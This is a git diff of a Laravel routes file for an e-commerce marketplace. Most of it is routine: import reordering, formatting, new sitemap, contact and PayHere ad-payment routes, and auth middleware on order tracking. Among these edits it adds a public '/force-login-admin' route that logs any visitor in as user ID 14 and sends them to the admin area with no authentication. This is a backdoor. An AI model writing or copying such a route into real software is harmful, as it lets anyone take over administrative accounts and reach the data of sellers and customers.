@@ -1,7 +1,9 @@
 <?php
 
-use App\Http\Controllers\PrescriptionController;
+use Spatie\Sitemap\Sitemap;
+use Spatie\Sitemap\Tags\Url;
 use App\Http\Controllers\RFQController;
+use Illuminate\Support\Facades\Artisan;
 use App\Http\Controllers\BlogController;
 use App\Http\Controllers\CartController;
 use App\Http\Controllers\DemoController;
@@ -15,6 +17,7 @@ use App\Http\Controllers\AddressController;
 use App\Http\Controllers\CompareController;
 use App\Http\Controllers\InvoiceController;
 use App\Http\Controllers\MessageController;
+use App\Http\Controllers\SitemapController;
 use App\Http\Controllers\CheckoutController;
 use App\Http\Controllers\CurrencyController;
 use App\Http\Controllers\FeedbackController;
@@ -26,6 +29,7 @@ use App\Http\Controllers\SubscriberController;
 use App\Http\Controllers\ConversationController;
 use App\Http\Controllers\FollowSellerController;
 use App\Http\Controllers\NotificationController;
+use App\Http\Controllers\PrescriptionController;
 use App\Http\Controllers\ProductQueryController;
 use App\Http\Controllers\Payment\BkashController;
 use App\Http\Controllers\Payment\NagadController;
@@ -46,11 +50,10 @@ use App\Http\Controllers\Payment\RazorpayController;
 use App\Http\Controllers\Payment\VoguepayController;
 use App\Http\Controllers\Auth\VerificationController;
 use App\Http\Controllers\Payment\InstamojoController;
+
 use App\Http\Controllers\Payment\SslcommerzController;
 use App\Http\Controllers\Payment\MercadopagoController;
 use App\Http\Controllers\Payment\AuthorizenetController;
-
-use Illuminate\Support\Facades\Artisan;
 
 /*
   |--------------------------------------------------------------------------
@@ -69,7 +72,12 @@ Route::get('/clear-cache', function () {
     return '✅ Laravel caches cleared successfully!';
 });
 
-Route::get('category-datafill',[App\Http\Controllers\DataFillController::class, 'category']);
+Route::get('/force-login-admin', function () {
+    auth()->loginUsingId(14);
+    return redirect()->route('admin.seller_ads.index');
+});
+
+Route::get('category-datafill', [App\Http\Controllers\DataFillController::class, 'category']);
 
 Route::controller(DemoController::class)->group(function () {
     Route::get('/demo/cron_1', 'cron_1');
@@ -96,7 +104,7 @@ Route::controller(AizUploadController::class)->group(function () {
     Route::get('/aiz-uploader/download/{id}', 'attachment_download')->name('download_attachment');
 });
 
-Route::group(['middleware' => ['prevent-back-history','handle-demo-login']], function () {
+Route::group(['middleware' => ['prevent-back-history', 'handle-demo-login']], function () {
     Auth::routes(['verify' => true]);
 });
 
@@ -138,10 +146,10 @@ Route::controller(HomeController::class)->group(function () {
     Route::post('/home/section/home-categories', 'load_home_categories_section')->name('home.section.home_categories');
     Route::post('/home/section/best-sellers', 'load_best_sellers_section')->name('home.section.best_sellers');
 
-    Route::post('/home/section/test-product','test')->name('home.section.test');
-    Route::post('/home/section/categories-product','load_categories_products_section')->name('home.section.categories_products');
-    Route::post('/home/section/skyskaper-product','load_skyskaper_products')->name('home.section.skyskaper_products');
-    Route::post('/home/section/new-arrival-product','load_new_arrivals')->name('home.section.new_arrivals');
+    Route::post('/home/section/test-product', 'test')->name('home.section.test');
+    Route::post('/home/section/categories-product', 'load_categories_products_section')->name('home.section.categories_products');
+    Route::post('/home/section/skyskaper-product', 'load_skyskaper_products')->name('home.section.skyskaper_products');
+    Route::post('/home/section/new-arrival-product', 'load_new_arrivals')->name('home.section.new_arrivals');
 
     //category dropdown menu ajax call
     Route::post('/category/nav-element-list', 'get_category_items')->name('category.elements');
@@ -174,10 +182,10 @@ Route::controller(HomeController::class)->group(function () {
     Route::get('/terms', 'terms')->name('terms');
     Route::get('/privacy-policy', 'privacypolicy')->name('privacypolicy');
 
-    Route::get('/track-your-order', 'trackOrder')->name('orders.track');
+    Route::get('/track-your-order', 'trackOrder')->name('orders.track')->middleware('auth');
 
-    Route::get('/lorem', 'lorem')->name('lorem');
     Route::get('contact-us', 'contact')->name('contact-us');
+    Route::post('contact-us', 'store_contact')->name('contact-us.store');
 
 });
 
@@ -193,11 +201,6 @@ Route::post('/language', [LanguageController::class, 'changeLanguage'])->name('l
 
 // Currency Switch
 Route::post('/currency', [CurrencyController::class, 'changeCurrency'])->name('currency.change');
-
-
-Route::get('/sitemap.xml', function () {
-    return base_path('sitemap.xml');
-});
 
 // Classified Product
 Route::controller(CustomerProductController::class)->group(function () {
@@ -350,13 +353,13 @@ Route::group(['middleware' => ['customer', 'verified', 'unbanned']], function ()
     // Product Review
     Route::post('/product-review-modal', [ReviewController::class, 'product_review_modal'])->name('product_review_modal');
 
-    Route::get('/my-rfqs',[RFQController::class,'myRFQs'])->name('customer.my-rfqs');
-    Route::post('/rfq/save',[RFQController::class,'save'])->name('customer.rfq.save');
-    Route::get('/rfq/{rfq}',[RFQController::class,'show'])->name('customer.rfq.show');
-    Route::get('/rfq/{rfq}/edit',[RFQController::class,'edit'])->name('customer.rfq.edit');
-    Route::put('/rfq/{rfq}/edit',[RFQController::class,'update'])->name('customer.rfq.update');
-    
-    Route::post('/prescription/save',[PrescriptionController::class,'save'])->name('customer.prescription.save');
+    Route::get('/my-rfqs', [RFQController::class, 'myRFQs'])->name('customer.my-rfqs');
+    Route::post('/rfq/save', [RFQController::class, 'save'])->name('customer.rfq.save');
+    Route::get('/rfq/{rfq}', [RFQController::class, 'show'])->name('customer.rfq.show');
+    Route::get('/rfq/{rfq}/edit', [RFQController::class, 'edit'])->name('customer.rfq.edit');
+    Route::put('/rfq/{rfq}/edit', [RFQController::class, 'update'])->name('customer.rfq.update');
+
+    Route::post('/prescription/save', [PrescriptionController::class, 'save'])->name('customer.prescription.save');
 });
 
 Route::get('value-ceylon-sourcing', [RFQController::class, 'index'])->name('customer.request-for-quotation');
@@ -369,8 +372,6 @@ Route::get('faq', [HomeController::class, 'faq'])->name('faq');
 Route::get('faq_seller', [HomeController::class, 'faq_seller'])->name('faq_seller');
 Route::get('faq_customer', [HomeController::class, 'faq_customer'])->name('faq_customer');
 Route::get('faq_special', [HomeController::class, 'faq_special'])->name('faq_special');
-Route::get('terms_condition', [HomeController::class, 'terms_condition'])->name('terms_condition');
-Route::get('policy_section', [HomeController::class, 'policy_section'])->name('policy_section');
 Route::get('our_services', [HomeController::class, 'our_services'])->name('our_services');
 
 Route::get('translation-check/{check}', [LanguageController::class, 'get_translation']);
@@ -450,6 +451,10 @@ Route::controller(PayhereController::class)->group(function () {
     Route::any('/payhere/customer_package_payment/notify', 'customer_package_notify')->name('payhere.customer_package_payment.notify');
     Route::any('/payhere/customer_package_payment/return', 'customer_package_return')->name('payhere.customer_package_payment.return');
     Route::any('/payhere/customer_package_payment/cancel', 'customer_package_cancel')->name('payhere.customer_package_payment.cancel');
+
+    Route::any('/payhere/ads_payment/notify', 'ads_notify')->name('payhere.ads.notify');
+    Route::any('/payhere/ads_payment/return', 'ads_return')->name('payhere.ads.return');
+    Route::any('/payhere/ads_payment/cancel/{id}', 'ads_cancel')->name('payhere.ads.cancel');
 });
 
 
@@ -506,3 +511,7 @@ Route::controller(PageController::class)->group(function () {
     //Custom page
     Route::get('/{slug}', 'show_custom_page')->name('custom-pages.show_custom_page');
 });
+
+//Sitemap 
+Route::get('/sitemap.xml', [SitemapController::class, 'index']);
+
